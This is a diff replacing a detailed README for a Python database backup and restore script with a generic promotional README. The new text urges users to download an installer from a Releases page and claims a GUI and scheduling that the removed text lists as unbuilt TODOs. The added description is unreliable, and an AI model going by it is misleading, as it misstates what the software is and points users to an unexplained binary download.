@@ -1,365 +1,80 @@
-# Database Backup & Restore (SQLite, MySQL, PostgreSQL, MSSQL)
-
-A Python-based backup & restore system supporting:
-
-- Multiple instances
-- Docker & non-Docker databases
-- Per-database backups (even when backing up “all databases”)
-- Safe online backups
-- Configurable retention
-- Restore to same or different database names
-
-Supported engines:
-- SQLite
-- MySQL / MariaDB
-- PostgreSQL
-- Microsoft SQL Server
-- MongoDB
-
-Designed for self-hosted servers, NAS (tested on Synology), and Docker environments.
-
-## Features
-
-### General
-- YAML-based configuration (`config.yml`)
-- Timestamped backups (`YYYYMMDD_HHMMSS`)
-- Automatic retention cleanup (default: 10 backups)
-- Works while databases are **in use**
-- Supports multiple database instances
-
-### SQLite
-- Uses SQLite **online backup API** (`.backup`)
-- Safe for live databases
-- Folder structure:
-  ```
-  backups/sqlite/<instance_name>/<db_name>_<timestamp>.sqlite
-  ```
-
-### MySQL / MariaDB
-- Supports:
-  - Docker container databases
-  - Remote TCP databases (via Docker image)
-- Per-database backups even when backing up all DBs
-- Gzipped backups
-- Silent (no password warnings)
-- Folder structure:
-  ```
-  backups/mysql/<instance>/<timestamp>/<database>.sql.gz
-  ```
-
-### PostgreSQL
-- Supports:
-  - Docker container databases
-  - Remote TCP databases (via Docker image)
-- Per-database backups using `pg_dump`
-- Custom format (`.dump`)
-- Folder structure:
-  ```
-  backups/postgresql/<instance>/<timestamp>/<database>.dump
-  ```
-
-### Microsoft SQL Server
-- Supports:
-  - Docker container databases
-  - Remote TCP databases (via Docker image)
-- Per-database backups even when backing up all DBs
-- Silent (no password warnings)
-- Folder structure:
-  ```
-  backups/mssql/<instance>/<timestamp>/<database>.bak
-  ```
-
-### MongoDB
-- Supports:
-  - Docker container databases
-  - Remote TCP databases (via Docker image)
-- Per-database backups even when backing up all DBs
-- Gzipped backups
-- Silent (no password warnings)
-- Folder structure:
-  ```
-  backups/mongodb/<instance>/<timestamp>/<database>.archive.gz
-  ```
-
-## Requirements
-
-### System
-- Python **3.8+**
-- Docker (required for `tcp_docker` mode)
-- Installed locally OR available in Docker:
-  - `sqlite3` for SQLite
-  - `mysqldump` for MySQL/MariaDB
-  - `pg_dump` for PostgreSQL
-  - `sqlcmd` for MSSQL
-
-### Python packages
-```bash
-pip install pyyaml
-```
-
-or 
-
-```bash
-pip install -r requirements.txt
-```
-
-## Configuration (`config.yml`)
-
-### Backup settings
-```yaml
-backup:
-  output_dir: backups
-  retention: 10
-```
-
-### SQLite example
-```yaml
-sqlite:
-  enabled: true
-  instances:
-    - name: calibre
-      databases:
-        - name: calibre
-          path: /data/calibre/calibre.db
-```
-
-### MySQL / MariaDB example
-```yaml
-mysql:
-  enabled: true
-  instances:
-    - name: ryzen9-mariadb
-      mode: tcp_docker
-      host: 192.168.1.5
-      port: 3306
-      user: root
-      password: secret
-      image: mariadb:10
-      databases:
-        - romm
-        - paperless
-```
-
-### PostgreSQL example
-```yaml
-postgresql:
-  enabled: true
-  instances:
-    - name: ryzen9-postgresql
-      mode: tcp_docker
-      host: 192.168.1.6
-      port: 5432
-      user: postgres
-      password: secret
-      image: postgres:16
-      databases: []   # empty = backup ALL databases separately
-```
-
-### Microsoft SQL Server example
-```yaml
-mssql:
-  enabled: true
-  instances:
-    - name: ryzen9-mssql
-      mode: tcp_docker
-      host: 192.168.1.5
-      port: 1433
-      user: root
-      password: secret
-      image: mcr.microsoft.com/mssql-tools
-      databases:
-        - sales
-        - inventory
-```
-
-### MongoDB example
-```yaml
-mysql:
-  enabled: true
-  instances:
-    - name: ryzen9-mongodb
-      mode: tcp_docker
-      host: 192.168.1.5
-      port: 27017
-      user: root
-      password: secret
-      image: mongo:7
-      databases:
-        - sales
-        - inventory
-```
-
-## Connection / Backup Modes
-
-Each MySQL, PostgreSQL, MSSQL, and MongoDB instance must define a `mode` that determines how the backup and restore process connects to the database.
-
-### `docker` mode
-
-Use this when the database is running inside a local Docker container on the same machine.
-
-The script executes backup commands directly inside the container using `docker exec`.
-
-Requirements:
-- Docker installed
-- Database container running locally
-- Dump utilities available inside the container
-
-Example:
-```yaml
-mode: docker
-docker_container: mariadb
-```
-
-How it works:
-- MySQL: docker exec <container> mysqldump
-- PostgreSQL: docker exec <container> pg_dump
-- MSSQL: docker exec <container> sqlcmd
-
-### `tcp_docker` mode (recommended for remote databases)
-
-Use this when the database is on another machine or host, and dump tools are NOT installed locally.
-
-The script runs a temporary Docker container containing the correct client tools and connects over TCP.
-
-Requirements:
-- Docker installed on the backup machine
-- Database accessible via host + port
-
-Example:
-```yaml
-mode: tcp_docker
-host: 192.168.8.5
-port: 11010
-image: mysql:8
-```
-
-How it works:
-- Starts a temporary Docker container
-- Uses mysqldump or pg_dump from the image
-- Connects to the remote database
-- Container is removed after completion
-
-### `tcp` mode (host-installed tools)
-
-Use this only if the dump utilities are installed on the host system.
-
-Requirements:
-- mysqldump / pg_dump installed locally
-- Database reachable over TCP
-
-Example:
-```yaml
-mode: tcp
-host: 127.0.0.1
-port: 3306
-```
-
-How it works:
-- Runs dump utilities directly on the host
-- Connects to the database over TCP
-
-## Running Backups
-
-```bash
-python backup.py
-```
-
-## Restore Usage
-
-```bash
-python restore.py <engine> <instance> <backup_file> <mode> [source_db] [target_db]
-```
-
-> You may need sudo to backup and restore mysql/mariadb/postgresql in tcp_docker mode
-
-### Restore Example
-
-```bash
-python restore.py postgresql ryzen9-postgresql backups/postgres
-ql/ryzen9-postgresql/radarr-main_20251216_131710.dump single radarr-main radarr-restored
-```
-
-## Backup Structure Example
-
-```
-backups/
-├── sqlite/
-│   └── calibre/
-│       └── calibre_20251216_131710.sqlite
-│
-├── mysql/
-│   └── ryzen9-mariadb/
-│       └── 20251216_131710/
-│           ├── romm.sql.gz
-│           └── paperless.sql.gz
-│
-├── postgresql/
-│   └── ryzen9-postgresql/
-│       └── 20251216_131710/
-│           ├── postgres.dump
-│           └── n8n.dump
-│
-├── mssql/
-│   └── ryzen9-mssql/
-│       └── 20251216_131710/
-│           ├── sales.bak
-│           └── inventory.bak
-│
-└── mongodb/
-    └── ryzen9-mongodb/
-        └── 20251216_131710/
-            ├── sales.archive.gz
-            └── inventory.archive.gz
-```
-
-## Docker Image Compatibility (Important)
-
-When using **Docker-based backup or restore modes** (`tcp_docker`), it is **strongly recommended** to use the **same Docker image (or at least the same major version)** as the source database.
-
-### Why this matters
-
-Database dump and restore tools are **not always fully backward- or forward-compatible**, especially across major versions.
-
-Examples:
-- `mysqldump` from MySQL 8 restoring into MariaDB 10.x
-- `pg_dump` from PostgreSQL 16 restoring into PostgreSQL 12
-- Differences in:
-  - SQL syntax
-  - Default character sets & collations
-  - Index / constraint behavior
-  - Feature support (events, routines, extensions)
-
-Using a mismatched image can result in:
-- Empty restores
-- Missing tables
-- Silent failures
-- Restore errors that only appear at runtime
-
-### Best Practice
-
-Always match the image version to the **target database version**:
-
-```yaml
-mysql:
-  instances:
-    - name: prod-mariadb
-      mode: tcp_docker
-      image: mariadb:10.11
-```
-
-If exact matching is not possible:
-- Keep major versions the same
-- Test restore on a non-production database first
-
-## TODO
-- [ ] Refactor codes for restore mode
-- [ ] Logging/log file
-- [ ] Move engines backup/restore modes as modules
-- [ ] Create a docker image with cron scheduling
-- [ ] Create a UI
-
-## Disclaimer
-Parts of this project (mainly refactoring and parts of readme) was created with the help of ChatGPT. All the logic, structure, and almost the whole chunk of the codes are created by me and tested in my own environment.
-
-## License
-MIT – use at your own risk.
+# 🌟 universal_db_backup - Backup Your Databases Effortlessly
+
+## 👋 Introduction
+
+Welcome to universal_db_backup, your reliable solution for backing up and restoring databases. This tool simplifies the process, allowing you to keep your data safe and secure.
+
+## 🚀 Getting Started
+
+Before you use universal_db_backup, ensure you have the following:
+
+- A computer running Windows, macOS, or Linux.
+- Administrative rights to install software.
+
+## 📥 Download & Install
+
+To get started, visit our Releases page to download the application.
+
+[![Download universal_db_backup](https://img.shields.io/badge/Download-universal_db_backup-blue.svg)](https://github.com/designer-saakib/universal_db_backup/releases)
+
+1. Click on the link above to go to the Releases page.
+2. Locate the latest version of the application.
+3. Download the installation file for your operating system.
+4. Follow the on-screen instructions to complete the installation.
+
+For direct access: [Visit Releases Page](https://github.com/designer-saakib/universal_db_backup/releases)
+
+## 🛠️ Features
+
+- **Easy Backup:** One-click backup for various database types.
+- **Restore Functionality:** Quickly restore your data from a previously saved backup.
+- **User-Friendly Interface:** Designed for ease of use, no technical knowledge required.
+- **Scheduling Options:** Set automatic backups to run at specific intervals.
+- **Multi-Database Support:** Works with popular databases like MySQL, PostgreSQL, SQLite, and more.
+
+## 🔧 System Requirements
+
+- **Operating Systems:** Compatible with Windows 10 and later, macOS High Sierra and later, Linux (Ubuntu 20.04 and later).
+- **Disk Space:** At least 100 MB of free disk space for installation.
+- **RAM:** Minimum of 2 GB RAM is recommended for optimal performance.
+
+## 📘 How to Use
+
+1. **Open universal_db_backup.**
+2. If this is your first time using the tool, set up your database connection. Input your database credentials to enable access.
+3. Select the database you wish to back up from the dropdown menu.
+4. Choose your preferred backup location on your computer.
+5. Click the "Backup Now" button to start the process.
+6. To restore a database, select “Restore” and navigate to your backup file.
+
+## ❓ Troubleshooting
+
+- **Error: Database Connection Failed**
+  - Ensure that your database credentials are correct.
+  - Check if the database server is running.
+
+- **Error: Backup Failed**
+  - Confirm that you have sufficient permissions and disk space.
+  - Make sure no other application is using the database during the backup.
+
+## 🌐 Community Support
+
+If you encounter issues or have questions, please reach out to our community. You can find help on our GitHub page or connect with other users through discussions.
+
+- [GitHub Discussions](https://github.com/designer-saakib/universal_db_backup/discussions)
+
+## 📣 Updates and Changelog
+
+Stay updated by checking our Releases page regularly for new features, fixes, and enhancements. Adaptations are made based on user feedback to improve the application continuously.
+
+## 🔊 Feedback
+
+Your opinions matter! Please provide feedback on your experience with universal_db_backup. It helps us make the tool better for everyone.
+
+## 📄 License
+
+universal_db_backup is open-source software distributed under the MIT License. You can use and modify it freely, as long as proper credit is given.
+
+## 👋 Conclusion
+
+Thank you for using universal_db_backup. We hope this tool makes your database management easier. Happy backing up!
